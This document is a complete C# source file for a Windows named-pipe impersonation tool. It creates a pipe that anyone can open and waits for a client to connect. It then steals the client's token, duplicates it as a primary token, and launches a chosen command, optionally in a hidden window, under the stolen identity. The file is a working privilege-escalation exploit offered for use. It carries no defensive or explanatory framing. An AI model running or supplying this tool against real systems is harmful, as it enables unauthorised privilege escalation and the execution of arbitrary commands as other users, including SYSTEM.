using System;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;

namespace NamedPipeImpersonator
{
    internal class Program
    {
        /* ---------------------------------------------------------------------- */
        /* CONSTANTS
        /* ---------------------------------------------------------------------- */
        private const int ERROR_NOT_ALL_ASSIGNED = 1300; // From winerror.h
        

        /* ------------------------------------------------------------------------ */
        /* ENUMS
        /* ------------------------------------------------------------------------ */
        [Flags]
        enum PipeOpenMode : UInt32
        {
            PIPE_ACCESS_OUTBOUND = 0x00000002,
            PIPE_ACCESS_INBOUND = 0x00000001,
            PIPE_ACCESS_DUPLEX = 0x00000003
        }

        [Flags]
        enum PipeMode: UInt32
        {
            PIPE_TYPE_BYTE = 0x00000000,
            PIPE_READMODE_BYTE = 0x00000000,
            PIPE_WAIT = 0x00000000,
            PIPE_ACCEPT_REMOTE_CLIENTS = 0x00000000
        }

        [Flags]
        enum AccessTokenAccessMask: UInt32
        {
            SAME_AS_EXISTING_TOKEN = 0x0,
            TOKEN_ALL_ACCESS = (UInt32)(((0x000F0000L) | (0x0001) | (0x0002) | (0x0004) | (0x0008) | (0x0010) | (0x0020) | (0x0040) | (0x0080)) | (0x0100)),
            TOKEN_IMPERSONATE = 0x4,
            TOKEN_QUERY = 0x8,
            TOKEN_DUPLICATE = 0x2,
            TOKEN_ASSIGN_PRIMARY = 0x1,

        }

        [Flags]
        enum SecurityImpersonationLevel: UInt32
        {
            SecurityAnonymous = 0x0,
            SecurityIdentification = 0x1,
            SecurityImpersonation = 0x2,
            SecurityDelegation = 0x3
        }

        [Flags]
        enum TokenType: UInt32
        {
            TokenPrimary = 0x1,
            TokenImpersonation = 0x2
        }

        [Flags]
        enum LogonFlags: UInt32
        {
            LOGON_WITH_PROFILE = 0x1,
            LOGON_NETCREDENTIALS_ONLY = 0x2
        }

        [Flags]
        enum ProcessCreationFlags: UInt32
        {
            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
            CREATE_NEW_CONSOLE = 0x00000010,
            CREATE_NEW_PROCESS_GROUP = 0x00000200,
            CREATE_NO_WINDOW = 0x08000000,
            CREATE_PROTECTED_PROCESS = 0x00040000,
            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
            CREATE_SECURE_PROCESS = 0x00400000,
            CREATE_SEPARATE_WOW_VDM = 0x00000800,
            CREATE_SHARED_WOW_VDM = 0x00001000,
            CREATE_SUSPENDED = 0x00000004,
            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
            DEBUG_PROCESS = 0x00000001,
            DETACHED_PROCESS = 0x00000008,
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
            INHERIT_PARENT_AFFINITY = 0x00010000

        }

        [Flags]
        private enum PrivilegeAttributes : uint
        {
            SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x00000001,
            SE_PRIVILEGE_ENABLED = 0x00000002,
            SE_PRIVILEGE_REMOVED = 0x00000004,
            SE_PRIVILEGE_USED_FOR_ACCESS = 0x80000000
        }

        /* ------------------------------------------------------------------------ */
        /* STRUCTS
        /* ------------------------------------------------------------------------ */

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        struct STARTUPINFO
        {
            public UInt32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public UInt32 dwX;
            public UInt32 dwY;
            public UInt32 dwXSize;
            public UInt32 dwYSize;
            public UInt32 dwXCountChars;
            public UInt32 dwYCountChars;
            public UInt32 dwFillAttribute;
            public UInt32 dwFlags;
            public UInt16 wShowWindow;
            public UInt16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public UInt32 dwProcessId;
            public UInt32 dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 4)]
        private struct LUID
        {
            public uint LowPart;
            public int HighPart;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 4)]
        private struct LUID_AND_ATTRIBUTES
        {
            public LUID Luid;
            public PrivilegeAttributes Attributes;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 4)]
        private struct TOKEN_PRIVILEGES
        {
            public uint PrivilegeCount;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)] // Adjust SizeConst if enabling multiple privileges at once.
            public LUID_AND_ATTRIBUTES[] Privileges;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct SECURITY_DESCRIPTOR
        {
            public Byte Revision;
            public Byte Sbz1;
            public UInt16 Control;
            public IntPtr Owner;
            public IntPtr Group;
            public IntPtr Sacl;
            public IntPtr Dacl;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct SECURITY_ATTRIBUTES
        {
            public UInt32 nLength;
            public IntPtr lpSecurityDescriptor;
            public UInt32 bInheritHandle;
        }


        /* ------------------------------------------------------------------------ */
        /* IMPORTED FUNCTIONS
        /* ------------------------------------------------------------------------ */
        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Auto)]
        private static extern IntPtr CreateNamedPipe(
                string lpName, // \\.\pipe\pipename
                PipeOpenMode dwOpenMode,
                PipeMode dwPipeMode,
                UInt32 nMaxInstances,
                UInt32 nOutBufferSize,
                UInt32 nInBufferSize,
                UInt32 nDefaultTimeOut,
                ref SECURITY_ATTRIBUTES lpSecurityAttributes
            );

        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Auto)]
        private static extern UInt32 ConnectNamedPipe(
                IntPtr hNamedPipe,
                IntPtr lpOverlapped
            );

        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Auto)]
        private static extern UInt32 CloseHandle(
                IntPtr handle
            );

        [DllImport("Advapi32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Auto)]
        private static extern UInt32 ImpersonateNamedPipeClient(
                IntPtr hNamedPipe
            );

        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Auto)]
        private static extern IntPtr GetCurrentThread();

        [DllImport("Advapi32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Auto)]
        private static extern UInt32 OpenThreadToken(
          IntPtr ThreadHandle,
          AccessTokenAccessMask DesiredAccess,
          UInt32 OpenAsSelf,
          ref IntPtr TokenHandle
        );

        [DllImport("Advapi32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Auto)]
        private static extern UInt32 DuplicateTokenEx(
            IntPtr hExistingToken,
            AccessTokenAccessMask dwDesiredAccess,
            IntPtr lpTokenAttributes,
            SecurityImpersonationLevel ImpersonationLevel,
            TokenType TokenType,
            ref IntPtr phNewToken
        );

        [DllImport("Advapi32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Auto)]
        private static extern UInt32 CreateProcessWithToken(
          IntPtr hToken,
          LogonFlags dwLogonFlags,
          string lpApplicationName,
          string lpCommandLine,
          ProcessCreationFlags dwCreationFlags,
          IntPtr lpEnvironment,
          string lpCurrentDirectory,
          ref STARTUPINFO lpStartupInfo,
          ref PROCESS_INFORMATION lpProcessInformation
        );

        [DllImport("Advapi32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Auto)]
        private static extern UInt32 CreateProcessAsUser(
          IntPtr hToken,
          string lpApplicationName,
          string lpCommandLine,
          IntPtr lpProcessAttributes,
          IntPtr lpThreadAttributes,
          UInt32 bInheritHandles,
          ProcessCreationFlags dwCreationFlags,
          IntPtr lpEnvironment,
          string lpCurrentDirectory,
          ref STARTUPINFO lpStartupInfo,
          ref PROCESS_INFORMATION lpProcessInformation
        );

        [DllImport("advapi32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool LookupPrivilegeValue(
            string lpSystemName,
            string lpName,
            out LUID lpLuid);

        [DllImport("advapi32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool AdjustTokenPrivileges(
           IntPtr TokenHandle,
           bool DisableAllPrivileges,
           [In] ref TOKEN_PRIVILEGES NewState,
           uint BufferLength,
           IntPtr PreviousState, //out TOKEN_PRIVILEGES PreviousState
           IntPtr ReturnLength); //out uint ReturnLength

        [DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetCurrentProcess();


        [DllImport("advapi32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool OpenProcessToken(
            IntPtr ProcessHandle,
            TokenAccessLevels DesiredAccess,
            out IntPtr TokenHandle);

        [DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto, SetLastError = true)]
        private static extern UInt32 DisconnectNamedPipe(
            IntPtr hNamedPipe
        );

        [DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto, SetLastError = true)]
        private static extern UInt32 ReadFile(
          IntPtr hFile,
          IntPtr lpBuffer,
          UInt32 nNumberOfBytesToRead,
          ref UInt32 lpNumberOfBytesRead,
          IntPtr lpOverlapped
        );

        [DllImport("advapi32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto, SetLastError = true)]
        private static extern UInt32 RevertToSelf();

        [DllImport("advapi32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto, SetLastError = true)]
        private static extern UInt32 InitializeSecurityDescriptor(
          ref SECURITY_DESCRIPTOR pSecurityDescriptor,
          UInt32 dwRevision
        );

        [DllImport("advapi32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto, SetLastError = true)]
        private static extern UInt32 SetSecurityDescriptorDacl(
          ref SECURITY_DESCRIPTOR pSecurityDescriptor,
          UInt32 bDaclPresent,
          IntPtr pDacl,
          UInt32 bDaclDefaulted
        );

        /* ---------------------------------------------------------------------- */
        /* Enable a particular privilege
        /* ---------------------------------------------------------------------- */
        private static bool EnablePrivilege(string privilegeName)
        {
            if (!OpenProcessToken(GetCurrentProcess(), TokenAccessLevels.AdjustPrivileges | TokenAccessLevels.Query, out IntPtr tokenHandle))
            {
                return false;
            }

            LUID luid;
            if (!LookupPrivilegeValue(null, privilegeName, out luid))
            {
                CloseHandle(tokenHandle);
                return false;
            }

            TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
            tp.PrivilegeCount = 1;
            tp.Privileges = new LUID_AND_ATTRIBUTES[1];
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = PrivilegeAttributes.SE_PRIVILEGE_ENABLED;

            if (!AdjustTokenPrivileges(tokenHandle, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero))
            {
                CloseHandle(tokenHandle);
                return false;
            }

            if (Marshal.GetLastWin32Error() == ERROR_NOT_ALL_ASSIGNED)
            {
                CloseHandle(tokenHandle);
                return false;
            }

            CloseHandle(tokenHandle);
            return true;
        }

        /* ---------------------------------------------------------------------- */
        /* Read data from pipe
        /* ---------------------------------------------------------------------- */
        private static bool ReadDataFromPipe(IntPtr hPipe, bool readAllData) {
            // Initialise variables
            UInt32 bufferSize = (UInt32)(readAllData ? 0x1000 : 1);
            IntPtr buffer = Marshal.AllocHGlobal((IntPtr)bufferSize);
            UInt32 bytesRead = 0;
            UInt32 isSuccess = 0;

            if (buffer == IntPtr.Zero) return false;

            while (true)
            {
                isSuccess = ReadFile(
                   hPipe,
                   buffer,
                   bufferSize,
                   ref bytesRead,
                   IntPtr.Zero);

                int error = Marshal.GetLastWin32Error();

                if ((isSuccess == 0) || (bytesRead == 0) || !readAllData)
                {
                    Console.WriteLine(String.Format("Read data from connected client; isSuccess: {0}, error: {1}, bytesRead: {2}", isSuccess, error, bytesRead));
                    break;
                }
            }

            Marshal.FreeHGlobal(buffer);

            return true;
        }

        /* ---------------------------------------------------------------------- */
        /* Creates security attributes that allow Full access to Everyone
        /* ---------------------------------------------------------------------- */
        private static SECURITY_ATTRIBUTES CreateSecurityAttributesForEveryone()
        {
            SECURITY_DESCRIPTOR securityDescriptor = new SECURITY_DESCRIPTOR { };

            if (InitializeSecurityDescriptor(
                ref securityDescriptor,
                1
               ) == 0) {
                throw new Exception(String.Format("Failed to initialise security descriptor for pipe; error: {0}", Marshal.GetLastWin32Error()));
            };

            if (SetSecurityDescriptorDacl(
                ref securityDescriptor,
                1,
                IntPtr.Zero,
                0
                ) == 0) {
                throw new Exception(String.Format("Failed to set DACL in security descriptor for pipe; error: {0}", Marshal.GetLastWin32Error()));
            };

            IntPtr pSecurityDescriptor = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(SECURITY_DESCRIPTOR)));
            if (pSecurityDescriptor == IntPtr.Zero) {
                throw new Exception(String.Format("Failed to create unmanaged memory for security descriptor for pipe"));
            }
            Marshal.StructureToPtr<SECURITY_DESCRIPTOR>(securityDescriptor, pSecurityDescriptor, false);
            
            SECURITY_ATTRIBUTES securityAttributes = new SECURITY_ATTRIBUTES {
                bInheritHandle = 1,
                nLength = (UInt32)Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES)),
                lpSecurityDescriptor = pSecurityDescriptor
            };

            return securityAttributes;
        }

        /* ------------------------------------------------------------------------ */
        /* MAIN
        /* ------------------------------------------------------------------------ */
        static void Main(string[] args)
        {
            // Process command line parameters
            if(args.Length < 3 || (args.Length >= 1 && args[0] == "-h"))
            {
                Console.WriteLine(String.Format("USAGE: {0}.exe <HIDDEN|NOHIDDEN> <SELF|NEWPROCESS> PIPE_NAME [CMD] [ARGS]\nSELF impersonates token in current thread, and does not call RevertToSelf. NEWPROCESS impersonates token in new process, then calls RevertToSelf for current thread.\nCMD and ARGS are only used for NEWPROCESS", Process.GetCurrentProcess().ProcessName));
                return;
            }

            // Initialise variables
            bool isHidden = (args[0].ToLower() == "hidden");
            bool isSelf = (args[1].ToLower() == "self");
            string pipeName = args[2]; // \\.\pipe\pipename
            string processExecutablePath = (args.Length >= 4) ? args[3] : "";
            string[] processParameters = args.Skip(4).ToArray();
            string processCommandline = String.Format(
                "\"{0}\"{1}",
                processExecutablePath,
                processParameters.Length != 0 ? (" " + String.Join(" ", processParameters)) : ("")
                );
            string system32Dir = Environment.GetEnvironmentVariable("WINDIR") + "\\System32";

            IntPtr hPipe = IntPtr.Zero;
            IntPtr hThreadToken = IntPtr.Zero;
            IntPtr hPrimaryToken = IntPtr.Zero;

            try
            {
                // Create named pipe
                SECURITY_ATTRIBUTES namedPipeSecurityAttributes = CreateSecurityAttributesForEveryone();

                hPipe = CreateNamedPipe(
                    pipeName,
                    PipeOpenMode.PIPE_ACCESS_DUPLEX,
                    PipeMode.PIPE_TYPE_BYTE | PipeMode.PIPE_WAIT | PipeMode.PIPE_ACCEPT_REMOTE_CLIENTS | PipeMode.PIPE_READMODE_BYTE,
                    255,
                    0x1000,
                    0x1000,
                    60 * 1000,
                    ref namedPipeSecurityAttributes
                    );
                if (hPipe == IntPtr.Zero || hPipe == (IntPtr)0xffffffff) {
                    throw new Exception(String.Format("Failed to create named pipe; error: {0}", Marshal.GetLastWin32Error()));
                }
                Console.WriteLine(String.Format("Named pipe created: {0}", pipeName));

                // Wait for client to connect
                if (ConnectNamedPipe(hPipe, IntPtr.Zero) == 0x0)
                {
                    throw new Exception(String.Format("Failed to wait for connection; error: {0}", Marshal.GetLastWin32Error()));
                }
                Console.WriteLine(String.Format("Connection received"));

                // Read data from connected client
                ReadDataFromPipe(hPipe, false);

                // Impersonate connected client
                if (EnablePrivilege("SeImpersonatePrivilege"))
                {
                    Console.WriteLine("Enabled SeImpersonatePrivilege");
                }
                else
                {
                    Console.WriteLine("Could not enable SeImpersonatePrivilege; continuing anyways");
                }

                if (ImpersonateNamedPipeClient(hPipe) == 0x0)
                {
                    throw new Exception(String.Format("Failed to impersonate connected client; error: {0}", Marshal.GetLastWin32Error()));
                }
                
                if (isSelf)
                {
                    throw new Exception(String.Format("Connected client user '{0}' impersonated in current thread", WindowsIdentity.GetCurrent().Name));
                } else
                {
                    Console.WriteLine(String.Format("Connected client user '{0}' impersonated in current thread", WindowsIdentity.GetCurrent().Name));
                }

                // Get current thread
                IntPtr hThread = GetCurrentThread();

                // Open current thread token
                if (OpenThreadToken(
                        hThread,
                        AccessTokenAccessMask.TOKEN_DUPLICATE,
                        0,
                        ref hThreadToken
                    ) == 0) {
                    throw new Exception(String.Format("Failed to open current (impersonated) thread token; error: {0}", Marshal.GetLastWin32Error()));
                };

                // Duplicate thread token to create primary token
                if (DuplicateTokenEx(
                    hThreadToken,
                    AccessTokenAccessMask.TOKEN_ALL_ACCESS,
                    IntPtr.Zero,
                    SecurityImpersonationLevel.SecurityDelegation,
                    TokenType.TokenPrimary,
                    ref hPrimaryToken
                    ) == 0) {
                    throw new Exception(String.Format("Failed to duplicate current (impersonated) thread token; error: {0}", Marshal.GetLastWin32Error()));
                };

                // Start new process with new primary token
                STARTUPINFO startupInfo = new STARTUPINFO {
                    cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO)),
                    wShowWindow = (ushort)(isHidden ? 0 : 1)
                };

                PROCESS_INFORMATION processInformation = new PROCESS_INFORMATION();

                //// CreateProcessWithToken
                Console.WriteLine("Trying CreateProcessWithToken...");
                if (CreateProcessWithToken(
                    hPrimaryToken,
                    LogonFlags.LOGON_WITH_PROFILE,
                    processExecutablePath,
                    processCommandline,
                    (isHidden ? ProcessCreationFlags.CREATE_NO_WINDOW : 0) | ProcessCreationFlags.CREATE_NEW_PROCESS_GROUP,
                    IntPtr.Zero,
                    system32Dir,
                    ref startupInfo,
                    ref processInformation
                    ) == 0) {
                    Console.WriteLine(String.Format("CreateProcessWithToken failed; error: {0}\nTrying CreateProcessAsUser...", Marshal.GetLastWin32Error()));

                    //// CreateProcessAsUser
                    if (EnablePrivilege("SeIncreaseQuotaPrivilege"))
                    {
                        Console.WriteLine("Enabled SeIncreaseQuotaPrivilege");
                    }
                    else
                    {
                        Console.WriteLine("Could not enable SeIncreaseQuotaPrivilege; continuing anyways");
                    }

                    if (EnablePrivilege("SeAssignPrimaryTokenPrivilege"))
                    {
                        Console.WriteLine("Enabled SeAssignPrimaryTokenPrivilege");
                    }
                    else
                    {
                        Console.WriteLine("Could not enable SeAssignPrimaryTokenPrivilege; continuing anyways");
                    }

                    if (CreateProcessAsUser(
                        hPrimaryToken,
                        processExecutablePath,
                        processCommandline,
                        IntPtr.Zero,
                        IntPtr.Zero,
                        1,
                        (isHidden ? ProcessCreationFlags.CREATE_NO_WINDOW : 0) | ProcessCreationFlags.CREATE_NEW_PROCESS_GROUP,
                        IntPtr.Zero,
                        system32Dir,
                        ref startupInfo,
                        ref processInformation
                        ) == 0) {

                        throw new Exception(String.Format("CreateProcessAsUser failed; error: {0}", Marshal.GetLastWin32Error()));
                    }
                }

                Console.WriteLine(String.Format("New process started with impersonated primary token; PID: {0}", processInformation.dwProcessId));
            }
            catch (Exception e) {
                Console.WriteLine(e.Message);
            } finally
            {
                // Cleanup
                if (hPipe != IntPtr.Zero && hPipe != (IntPtr)0xffffffff)
                {
                    DisconnectNamedPipe(hPipe);
                    CloseHandle(hPipe);
                }

                if (hThreadToken != IntPtr.Zero)
                {
                    CloseHandle(hThreadToken);
                }

                if (hPrimaryToken != IntPtr.Zero) {
                    CloseHandle(hPrimaryToken);
                }

                if(!isSelf)
                {
                    RevertToSelf();
                }
            }
        }
    }
}
